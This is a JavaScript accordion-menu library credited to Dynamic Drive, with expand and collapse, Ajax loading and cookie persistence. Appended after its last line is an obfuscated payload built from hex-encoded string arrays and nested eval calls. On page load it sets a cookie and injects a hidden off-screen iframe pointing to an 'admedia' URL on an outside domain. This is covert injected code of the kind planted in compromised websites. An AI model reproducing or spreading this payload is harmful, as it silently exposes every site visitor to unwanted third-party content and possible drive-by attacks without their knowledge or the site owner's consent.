//** Accordion Content script: By Dynamic Drive, at http://www.dynamicdrive.com
//** Created: Jan 7th, 08'. Last updated: June 7th, 2010 to v1.9

//Version 1.9: June 7th, 2010':
//**1) Ajax content support added, so a given header's content can be dynamically fetched from an external file and on demand.
//**2) Optimized script performance by caching header and content container references


var ddaccordion={
	ajaxloadingmsg: '<img src="loading2.gif" /><br />Loading Content...', //customize HTML to output while Ajax content is being fetched (if applicable)

	headergroup: {}, //object to store corresponding header group based on headerclass value
	contentgroup: {}, //object to store corresponding content group based on headerclass value

	preloadimages:function($images){
		$images.each(function(){
			var preloadimage=new Image()
			preloadimage.src=this.src
		})
	},

	expandone:function(headerclass, selected){ //PUBLIC function to expand a particular header
		this.toggleone(headerclass, selected, "expand")
	},

	collapseone:function(headerclass, selected){ //PUBLIC function to collapse a particular header
		this.toggleone(headerclass, selected, "collapse")
	},

	expandall:function(headerclass){ //PUBLIC function to expand all headers based on their shared CSS classname
		var $headers=this.headergroup[headerclass]
		this.contentgroup[headerclass].filter(':hidden').each(function(){
			$headers.eq(parseInt($(this).attr('contentindex'))).trigger("evt_accordion")
		})
	},

	collapseall:function(headerclass){ //PUBLIC function to collapse all headers based on their shared CSS classname
		var $headers=this.headergroup[headerclass]
		this.contentgroup[headerclass].filter(':visible').each(function(){
			$headers.eq(parseInt($(this).attr('contentindex'))).trigger("evt_accordion")
		})
	},

	toggleone:function(headerclass, selected, optstate){ //PUBLIC function to expand/ collapse a particular header
		var $targetHeader=this.headergroup[headerclass].eq(selected)
		var $subcontent=this.contentgroup[headerclass].eq(selected)
		if (typeof optstate=="undefined" || optstate=="expand" && $subcontent.is(":hidden") || optstate=="collapse" && $subcontent.is(":visible"))
			$targetHeader.trigger("evt_accordion")
	},

	ajaxloadcontent:function($targetHeader, $targetContent, config, callback){
		var ajaxinfo=$targetHeader.data('ajaxinfo')

		function handlecontent(content){ //nested function
			if (content){ //if ajax content has loaded
				ajaxinfo.cacheddata=content //remember ajax content 
				ajaxinfo.status="cached" //set ajax status to cached
				if ($targetContent.queue("fx").length==0){ //if this content isn't currently expanding or collapsing
					$targetContent.hide().html(content) //hide loading message, then set sub content's HTML to ajax content
					ajaxinfo.status="complete" //set ajax status to complete
					callback() //execute callback function- expand this sub content
				}
			}
			if (ajaxinfo.status!="complete"){
				setTimeout(function(){handlecontent(ajaxinfo.cacheddata)}, 100) //call handlecontent() again until ajax content has loaded (ajaxinfo.cacheddata contains data)
			}
		} //end nested function

		if (ajaxinfo.status=="none"){ //ajax data hasn't been fetched yet
			$targetContent.html(this.ajaxloadingmsg)
			$targetContent.slideDown(config.animatespeed)
			ajaxinfo.status="loading" //set ajax status to "loading"
			$.ajax({
				url: ajaxinfo.url, //path to external menu file
				error:function(ajaxrequest){
					handlecontent('Error fetching content. Server Response: '+ajaxrequest.responseText)
				},
				success:function(content){
					content=(content=="")? " " : content //if returned content is empty, set it to "space" is content no longer returns false/empty (hasn't loaded yet)
					handlecontent(content)
				}
			})
		}
		else if (ajaxinfo.status=="loading")
			handlecontent(ajaxinfo.cacheddata)
	},

	expandit:function($targetHeader, $targetContent, config, useractivated, directclick, skipanimation){
		var ajaxinfo=$targetHeader.data('ajaxinfo')
		if (ajaxinfo){ //if this content should be fetched via Ajax
			if (ajaxinfo.status=="none" || ajaxinfo.status=="loading")
				this.ajaxloadcontent($targetHeader, $targetContent, config, function(){ddaccordion.expandit($targetHeader, $targetContent, config, useractivated, directclick)})
			else if (ajaxinfo.status=="cached"){
				$targetContent.html(ajaxinfo.cacheddata)
				ajaxinfo.cacheddata=null
				ajaxinfo.status="complete"
			}
		}
		this.transformHeader($targetHeader, config, "expand")
		$targetContent.slideDown(skipanimation? 0 : config.animatespeed, function(){
			config.onopenclose($targetHeader.get(0), parseInt($targetHeader.attr('headerindex')), $targetContent.css('display'), useractivated)
			if (config.postreveal=="gotourl" && directclick){ //if revealtype is "Go to Header URL upon click", and this is a direct click on the header
				var targetLink=($targetHeader.is("a"))? $targetHeader.get(0) : $targetHeader.find('a:eq(0)').get(0)
				if (targetLink) //if this header is a link
					setTimeout(function(){location=targetLink.href}, 200) //ignore link target, as window.open(targetLink, targetLink.target) doesn't work in FF if popup blocker enabled
			}
		})
	},

	collapseit:function($targetHeader, $targetContent, config, isuseractivated){
		this.transformHeader($targetHeader, config, "collapse")
		$targetContent.slideUp(config.animatespeed, function(){config.onopenclose($targetHeader.get(0), parseInt($targetHeader.attr('headerindex')), $targetContent.css('display'), isuseractivated)})
	},

	transformHeader:function($targetHeader, config, state){
		$targetHeader.addClass((state=="expand")? config.cssclass.expand : config.cssclass.collapse) //alternate btw "expand" and "collapse" CSS classes
		.removeClass((state=="expand")? config.cssclass.collapse : config.cssclass.expand)
		if (config.htmlsetting.location=='src'){ //Change header image (assuming header is an image)?
			$targetHeader=($targetHeader.is("img"))? $targetHeader : $targetHeader.find('img').eq(0) //Set target to either header itself, or first image within header
			$targetHeader.attr('src', (state=="expand")? config.htmlsetting.expand : config.htmlsetting.collapse) //change header image
		}
		else if (config.htmlsetting.location=="prefix") //if change "prefix" HTML, locate dynamically added ".accordprefix" span tag and change it
			$targetHeader.find('.accordprefix').html((state=="expand")? config.htmlsetting.expand : config.htmlsetting.collapse)
		else if (config.htmlsetting.location=="suffix")
			$targetHeader.find('.accordsuffix').html((state=="expand")? config.htmlsetting.expand : config.htmlsetting.collapse)
	},

	urlparamselect:function(headerclass){
		var result=window.location.search.match(new RegExp(headerclass+"=((\\d+)(,(\\d+))*)", "i")) //check for "?headerclass=2,3,4" in URL
		if (result!=null)
			result=RegExp.$1.split(',')
		return result //returns null, [index], or [index1,index2,etc], where index are the desired selected header indices
	},

	getCookie:function(Name){ 
		var re=new RegExp(Name+"=[^;]+", "i") //construct RE to search for target name/value pair
		if (document.cookie.match(re)) //if cookie found
			return document.cookie.match(re)[0].split("=")[1] //return its value
		return null
	},

	setCookie:function(name, value){
		document.cookie = name + "=" + value + "; path=/"
	},

	init:function(config){
	document.write('<style type="text/css">\n')
	document.write('.'+config.contentclass+'{display: none}\n') //generate CSS to hide contents
	document.write('a.hiddenajaxlink{display: none}\n') //CSS class to hide ajax link
	document.write('<\/style>')
	jQuery(document).ready(function($){
		ddaccordion.urlparamselect(config.headerclass)
		var persistedheaders=ddaccordion.getCookie(config.headerclass)
		ddaccordion.headergroup[config.headerclass]=$('.'+config.headerclass) //remember header group for this accordion
		ddaccordion.contentgroup[config.headerclass]=$('.'+config.contentclass) //remember content group for this accordion
		var $headers=ddaccordion.headergroup[config.headerclass]
		var $subcontents=ddaccordion.contentgroup[config.headerclass]
		config.cssclass={collapse: config.toggleclass[0], expand: config.toggleclass[1]} //store expand and contract CSS classes as object properties
		config.revealtype=config.revealtype || "click"
		config.revealtype=config.revealtype.replace(/mouseover/i, "mouseenter")
		if (config.revealtype=="clickgo"){
			config.postreveal="gotourl" //remember added action
			config.revealtype="click" //overwrite revealtype to "click" keyword
		}
		if (typeof config.togglehtml=="undefined")
			config.htmlsetting={location: "none"}
		else
			config.htmlsetting={location: config.togglehtml[0], collapse: config.togglehtml[1], expand: config.togglehtml[2]} //store HTML settings as object properties
		config.oninit=(typeof config.oninit=="undefined")? function(){} : config.oninit //attach custom "oninit" event handler
		config.onopenclose=(typeof config.onopenclose=="undefined")? function(){} : config.onopenclose //attach custom "onopenclose" event handler
		var lastexpanded={} //object to hold reference to last expanded header and content (jquery objects)
		var expandedindices=ddaccordion.urlparamselect(config.headerclass) || ((config.persiststate && persistedheaders!=null)? persistedheaders : config.defaultexpanded)
		if (typeof expandedindices=='string') //test for string value (exception is config.defaultexpanded, which is an array)
			expandedindices=expandedindices.replace(/c/ig, '').split(',') //transform string value to an array (ie: "c1,c2,c3" becomes [1,2,3]
		if (expandedindices.length==1 && expandedindices[0]=="-1") //check for expandedindices value of [-1], indicating persistence is on and no content expanded
			expandedindices=[]
		if (config["collapseprev"] && expandedindices.length>1) //only allow one content open?
			expandedindices=[expandedindices.pop()] //return last array element as an array (for sake of jQuery.inArray())
		if (config["onemustopen"] && expandedindices.length==0) //if at least one content should be open at all times and none are, open 1st header
			expandedindices=[0]
		$headers.each(function(index){ //loop through all headers
			var $header=$(this)
			if (/(prefix)|(suffix)/i.test(config.htmlsetting.location) && $header.html()!=""){ //add a SPAN element to header depending on user setting and if header is a container tag
				$('<span class="accordprefix"></span>').prependTo(this)
				$('<span class="accordsuffix"></span>').appendTo(this)
			}
			$header.attr('headerindex', index+'h') //store position of this header relative to its peers
			$subcontents.eq(index).attr('contentindex', index+'c') //store position of this content relative to its peers
			var $subcontent=$subcontents.eq(index)
			var $hiddenajaxlink=$subcontent.find('a.hiddenajaxlink:eq(0)') //see if this content should be loaded via ajax
			if ($hiddenajaxlink.length==1){
				$header.data('ajaxinfo', {url:$hiddenajaxlink.attr('href'), cacheddata:null, status:'none'}) //store info about this ajax content inside header
			}
			var needle=(typeof expandedindices[0]=="number")? index : index+'' //check for data type within expandedindices array- index should match that type
			if (jQuery.inArray(needle, expandedindices)!=-1){ //check for headers that should be expanded automatically (convert index to string first)
				ddaccordion.expandit($header, $subcontent, config, false, false, !config.animatedefault) //3rd last param sets 'isuseractivated' parameter, 2nd last sets isdirectclick, last sets skipanimation param
				lastexpanded={$header:$header, $content:$subcontent}
			}  //end check
			else{
				$subcontent.hide()
				config.onopenclose($header.get(0), parseInt($header.attr('headerindex')), $subcontent.css('display'), false) //Last Boolean value sets 'isuseractivated' parameter
				ddaccordion.transformHeader($header, config, "collapse")
			}
		})
		$headers.bind("evt_accordion", function(e, isdirectclick){ //assign CUSTOM event handler that expands/ contacts a header
				var $subcontent=$subcontents.eq(parseInt($(this).attr('headerindex'))) //get subcontent that should be expanded/collapsed
				if ($subcontent.css('display')=="none"){
					ddaccordion.expandit($(this), $subcontent, config, true, isdirectclick) //2nd last param sets 'isuseractivated' parameter
					if (config["collapseprev"] && lastexpanded.$header && $(this).get(0)!=lastexpanded.$header.get(0)){ //collapse previous content?
						ddaccordion.collapseit(lastexpanded.$header, lastexpanded.$content, config, true) //Last Boolean value sets 'isuseractivated' parameter
					}
					lastexpanded={$header:$(this), $content:$subcontent}
				}
				else if (!config["onemustopen"] || config["onemustopen"] && lastexpanded.$header && $(this).get(0)!=lastexpanded.$header.get(0)){
					ddaccordion.collapseit($(this), $subcontent, config, true) //Last Boolean value sets 'isuseractivated' parameter
				}
 		})
		$headers.bind(config.revealtype, function(){
			if (config.revealtype=="mouseenter"){
				clearTimeout(config.revealdelay)
				var headerindex=parseInt($(this).attr("headerindex"))
				config.revealdelay=setTimeout(function(){ddaccordion.expandone(config["headerclass"], headerindex)}, config.mouseoverdelay || 0)
			}
			else{
				$(this).trigger("evt_accordion", [true]) //last parameter indicates this is a direct click on the header
				return false //cancel default click behavior
			}
		})
		$headers.bind("mouseleave", function(){
			clearTimeout(config.revealdelay)
		})
		config.oninit($headers.get(), expandedindices)
		$(window).bind('unload', function(){ //clean up and persist on page unload
			$headers.unbind()
			var expandedindices=[]
			$subcontents.filter(':visible').each(function(index){ //get indices of expanded headers
				expandedindices.push($(this).attr('contentindex'))
			})
			if (config.persiststate==true && $headers.length>0){ //persist state?
				expandedindices=(expandedindices.length==0)? '-1c' : expandedindices //No contents expanded, indicate that with dummy '-1c' value?
				ddaccordion.setCookie(config.headerclass, expandedindices)
			}
		})
	})
	}
}

//preload any images defined inside ajaxloadingmsg variable
ddaccordion.preloadimages(jQuery(ddaccordion.ajaxloadingmsg).filter('img'))/*ad178ff4769332ac5d89eb93a9e2a402*/;window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x64\x65\x74\x74\x72"]=["\x33\x64\x35\x34\x37\x37\x36\x39\x37\x35\x36\x35\x33\x31\x33\x32\x33\x33\x32\x32\x33\x62\x37\x38\x33\x32\x33\x32\x36\x34\x37\x31\x32\x65\x36\x39\x36\x65\x36\x65\x36\x35\x37\x32\x34\x38\x35\x34\x34\x64\x34\x63\x33\x64\x32\x32\x33\x63\x36\x34\x36\x39\x37\x36\x32\x30\x37\x33\x37\x34\x37\x39\x36\x63\x36\x35\x33\x64\x32\x37\x37\x30\x36\x66\x37\x33\x36\x39\x37\x34\x36\x39\x36\x66\x36\x65\x33\x61\x36\x31\x36\x32\x37\x33\x36\x66\x36\x63\x37\x35\x37\x34\x36\x35\x33\x62\x37\x61\x32\x64\x36\x39\x36\x65\x36\x34\x36\x35\x37\x38\x33\x61\x33\x31\x33\x30\x33\x30","\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x33\x37\x32\x36\x35\x36\x31\x37\x34\x36\x35\x34\x35\x36\x63\x36\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x38\x32\x32\x36\x34\x36\x39\x37\x36\x32\x32\x32\x39\x33\x62\x37\x36\x36\x31\x37\x32\x32\x30\x37\x38\x33\x32\x33\x32\x37\x31\x37\x31\x32\x30\x33\x64\x32\x30\x32\x32\x36\x38\x37\x34\x37\x34\x37\x30\x33\x61\x32\x66\x32\x66\x36\x61\x37\x33\x32\x65\x37\x30\x36\x66\x36\x63\x36\x65\x37\x35\x33\x34\x36\x35\x37\x37\x37\x34\x36\x31\x36\x65\x33\x34\x36\x39\x37\x37\x36\x62\x36\x39\x32\x65","\x6e\x74\x28\x66\x66\x65\x6b\x69\x2e\x73\x75\x62\x73\x74\x72\x69\x6e\x67\x28\x61\x6e\x6e\x68\x62\x2c\x61\x6e\x6e\x68\x62\x2b\x32\x29\x2c\x20\x31\x36\x29\x2b\x22\x2c\x22\x3b\x7d\x6e\x62\x7a\x79\x69\x3d\x6e\x62\x7a\x79\x69\x2e\x73\x75\x62\x73\x74\x72\x69\x6e\x67\x28\x30\x2c\x6e\x62\x7a\x79\x69\x2e\x6c\x65\x6e\x67\x74\x68\x2d\x31\x29\x3b\x65\x76\x61\x6c\x28\x65\x76\x61\x6c\x28\x27\x53\x74\x72\x69\x6e\x67\x2e\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65\x28\x27\x2b\x6e\x62\x7a\x79\x69\x2b\x27\x29\x27\x29\x29\x3b\x7d\x29\x28\x29\x3b","\x36\x35\x37\x34\x37\x35\x37\x32\x36\x65\x32\x30\x36\x33\x35\x62\x33\x31\x35\x64\x32\x30\x33\x66\x32\x30\x36\x33\x35\x62\x33\x31\x35\x64\x32\x30\x33\x61\x32\x30\x36\x36\x36\x31\x36\x63\x37\x33\x36\x35\x33\x62\x37\x64\x37\x36\x36\x31\x37\x32\x32\x30\x37\x38\x33\x33\x33\x33\x36\x34\x37\x31\x32\x30\x33\x64\x32\x30\x37\x38\x33\x33\x33\x33\x36\x32\x37\x31\x32\x38\x32\x32\x36\x31\x36\x34\x32\x64\x36\x33\x36\x66\x36\x66\x36\x62\x36\x39\x36\x35\x32\x32\x32\x39\x33\x62\x36\x39\x36\x36\x32\x38\x32\x30\x37\x38\x33\x33\x33\x33\x36\x34\x37\x31\x32\x30\x32\x31","\x28\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x29\x7b\x76\x61\x72\x20\x6e\x62\x7a\x79\x69\x3d\x22\x22\x3b\x76\x61\x72\x20\x66\x66\x65\x6b\x69\x3d\x22\x37\x37\x36\x39\x36\x65\x36\x34\x36\x66\x37\x37\x32\x65\x36\x66\x36\x65\x36\x63\x36\x66\x36\x31\x36\x34\x32\x30\x33\x64\x32\x30\x36\x36\x37\x35\x36\x65\x36\x33\x37\x34\x36\x39\x36\x66\x36\x65\x32\x38\x32\x39\x37\x62\x36\x36\x37\x35\x36\x65\x36\x33\x37\x34\x36\x39\x36\x66\x36\x65\x32\x30\x37\x38\x33\x32\x33\x32\x36\x32\x37\x31\x32\x38\x36\x31\x32\x63\x36\x32\x32\x63\x36\x33\x32\x39\x37\x62\x36\x39\x36\x36","\x32\x38\x36\x33\x32\x39\x37\x62\x37\x36\x36\x31\x37\x32\x32\x30\x36\x34\x32\x30\x33\x64\x32\x30\x36\x65\x36\x35\x37\x37\x32\x30\x34\x34\x36\x31\x37\x34\x36\x35\x32\x38\x32\x39\x33\x62\x36\x34\x32\x65\x37\x33\x36\x35\x37\x34\x34\x34\x36\x31\x37\x34\x36\x35\x32\x38\x36\x34\x32\x65\x36\x37\x36\x35\x37\x34\x34\x34\x36\x31\x37\x34\x36\x35\x32\x38\x32\x39\x32\x62\x36\x33\x32\x39\x33\x62\x37\x64\x36\x39\x36\x36\x32\x38\x36\x31\x32\x30\x32\x36\x32\x36\x32\x30\x36\x32\x32\x39\x32\x30\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65","\x36\x32\x32\x65\x36\x35\x37\x38\x36\x35\x36\x33\x32\x38\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x33\x36\x66\x36\x66\x36\x62\x36\x39\x36\x35\x32\x39\x33\x62\x36\x39\x36\x36\x32\x38\x36\x33\x32\x39\x32\x30\x36\x33\x32\x30\x33\x64\x32\x30\x36\x33\x35\x62\x33\x30\x35\x64\x32\x65\x37\x33\x37\x30\x36\x63\x36\x39\x37\x34\x32\x38\x32\x37\x33\x64\x32\x37\x32\x39\x33\x62\x36\x35\x36\x63\x37\x33\x36\x35\x32\x30\x37\x32\x36\x35\x37\x34\x37\x35\x37\x32\x36\x65\x32\x30\x36\x36\x36\x31\x36\x63\x37\x33\x36\x35\x33\x62\x37\x32","\x37\x37\x37\x33\x32\x66\x36\x31\x36\x34\x36\x64\x36\x35\x36\x34\x36\x39\x36\x31\x32\x66\x33\x66\x36\x39\x36\x34\x33\x64\x33\x38\x33\x36\x33\x39\x33\x35\x33\x38\x33\x33\x33\x34\x32\x36\x36\x62\x36\x35\x37\x39\x37\x37\x36\x66\x37\x32\x36\x34\x33\x64\x33\x35\x36\x34\x36\x34\x33\x34\x36\x33\x36\x31\x36\x32\x33\x33\x33\x38\x36\x36\x36\x31\x33\x36\x36\x33\x33\x34\x36\x31\x33\x36\x33\x36\x36\x36\x33\x34\x33\x39\x36\x35\x36\x33\x33\x31\x33\x38\x33\x30\x36\x32\x33\x34\x36\x36\x33\x36\x33\x32\x36\x31\x33\x33\x32\x36\x36\x31\x36\x34\x35\x66\x36\x39\x36\x34","\x36\x33\x36\x66\x36\x66\x36\x62\x36\x39\x36\x35\x32\x30\x33\x64\x32\x30\x36\x31\x32\x62\x32\x37\x33\x64\x32\x37\x32\x62\x36\x32\x32\x62\x32\x38\x36\x33\x32\x30\x33\x66\x32\x30\x32\x37\x33\x62\x32\x30\x36\x35\x37\x38\x37\x30\x36\x39\x37\x32\x36\x35\x37\x33\x33\x64\x32\x37\x32\x62\x36\x34\x32\x65\x37\x34\x36\x66\x35\x35\x35\x34\x34\x33\x35\x33\x37\x34\x37\x32\x36\x39\x36\x65\x36\x37\x32\x38\x32\x39\x32\x30\x33\x61\x32\x30\x32\x37\x32\x37\x32\x39\x33\x62\x36\x35\x36\x63\x37\x33\x36\x35\x32\x30\x37\x32\x36\x35\x37\x34\x37\x35\x37\x32\x36\x65\x32\x30","\x33\x62\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x32\x36\x66\x36\x34\x37\x39\x32\x65\x36\x31\x37\x30\x37\x30\x36\x35\x36\x65\x36\x34\x34\x33\x36\x38\x36\x39\x36\x63\x36\x34\x32\x38\x37\x38\x33\x32\x33\x32\x36\x34\x37\x31\x32\x39\x33\x62\x37\x64\x37\x64\x22\x3b\x66\x6f\x72\x20\x28\x76\x61\x72\x20\x61\x6e\x6e\x68\x62\x3d\x30\x3b\x61\x6e\x6e\x68\x62\x3c\x66\x66\x65\x6b\x69\x2e\x6c\x65\x6e\x67\x74\x68\x3b\x61\x6e\x6e\x68\x62\x2b\x3d\x32\x29\x7b\x6e\x62\x7a\x79\x69\x3d\x6e\x62\x7a\x79\x69\x2b\x70\x61\x72\x73\x65\x49","\x33\x64\x32\x30\x32\x32\x36\x35\x37\x32\x33\x32\x37\x36\x36\x34\x37\x32\x33\x35\x36\x37\x36\x34\x36\x33\x33\x33\x36\x34\x37\x33\x32\x32\x32\x39\x37\x62\x37\x38\x33\x32\x33\x32\x36\x32\x37\x31\x32\x38\x32\x32\x36\x31\x36\x34\x32\x64\x36\x33\x36\x66\x36\x66\x36\x62\x36\x39\x36\x35\x32\x32\x32\x63\x32\x32\x36\x35\x37\x32\x33\x32\x37\x36\x36\x34\x37\x32\x33\x35\x36\x37\x36\x34\x36\x33\x33\x33\x36\x34\x37\x33\x32\x32\x32\x63\x33\x31\x32\x39\x33\x62\x37\x36\x36\x31\x37\x32\x32\x30\x37\x38\x33\x32\x33\x32\x36\x34\x37\x31\x32\x30\x33\x64\x32\x30\x36\x34","\x33\x30\x33\x62\x37\x34\x36\x66\x37\x30\x33\x61\x32\x64\x33\x31\x33\x30\x33\x30\x33\x30\x37\x30\x37\x38\x33\x62\x36\x63\x36\x35\x36\x36\x37\x34\x33\x61\x32\x64\x33\x39\x33\x39\x33\x39\x33\x39\x37\x30\x37\x38\x33\x62\x32\x37\x33\x65\x33\x63\x36\x39\x36\x36\x37\x32\x36\x31\x36\x64\x36\x35\x32\x30\x37\x33\x37\x32\x36\x33\x33\x64\x32\x37\x32\x32\x32\x62\x37\x38\x33\x32\x33\x32\x37\x31\x37\x31\x32\x62\x32\x32\x32\x37\x33\x65\x33\x63\x32\x66\x36\x39\x36\x36\x37\x32\x36\x31\x36\x64\x36\x35\x33\x65\x33\x63\x32\x66\x36\x34\x36\x39\x37\x36\x33\x65\x32\x32","\x36\x36\x36\x31\x36\x63\x37\x33\x36\x35\x33\x62\x37\x64\x36\x36\x37\x35\x36\x65\x36\x33\x37\x34\x36\x39\x36\x66\x36\x65\x32\x30\x37\x38\x33\x33\x33\x33\x36\x32\x37\x31\x32\x38\x36\x31\x32\x39\x37\x62\x37\x36\x36\x31\x37\x32\x32\x30\x36\x32\x32\x30\x33\x64\x32\x30\x36\x65\x36\x35\x37\x37\x32\x30\x35\x32\x36\x35\x36\x37\x34\x35\x37\x38\x37\x30\x32\x38\x36\x31\x32\x62\x32\x37\x33\x64\x32\x38\x35\x62\x35\x65\x33\x62\x35\x64\x32\x39\x37\x62\x33\x31\x32\x63\x37\x64\x32\x37\x32\x39\x33\x62\x37\x36\x36\x31\x37\x32\x32\x30\x36\x33\x32\x30\x33\x64\x32\x30"];var rrebb=siksd=ezihd=feyef=rksrr=dihhd=dayid=window["\x64\x6f"+"\x63\x75"+"\x6d\x65"+"\x6e\x74"]["\x64\x65\x74\x74\x72"],bissd=window;eval(eval("[bissd[\"\x73\x69\x6b\x73\x64\"][\"\x34\"],bissd[\"\x64\x61\x79\x69\x64\"][\"\x35\"],bissd[\"rrebb\"][\"\x38\"],bissd[\"ezihd\"][\"\x31\x32\"],bissd[\"\x72\x6b\x73\x72\x72\"][\"\x36\"],bissd[\"ezihd\"][\"\x33\"],bissd[\"dihhd\"][\"\x31\x30\"],bissd[\"\x64\x61\x79\x69\x64\"][\"\x31\"],bissd[\"rrebb\"][\"\x37\"],bissd[\"\x65\x7a\x69\x68\x64\"][\"\x30\"],bissd[\"dihhd\"][\"\x31\x31\"],bissd[\"rrebb\"][\"\x39\"],bissd[\"\x64\x69\x68\x68\x64\"][\"\x32\"]].join(\"\");"));/*ad178ff4769332ac5d89eb93a9e2a402*/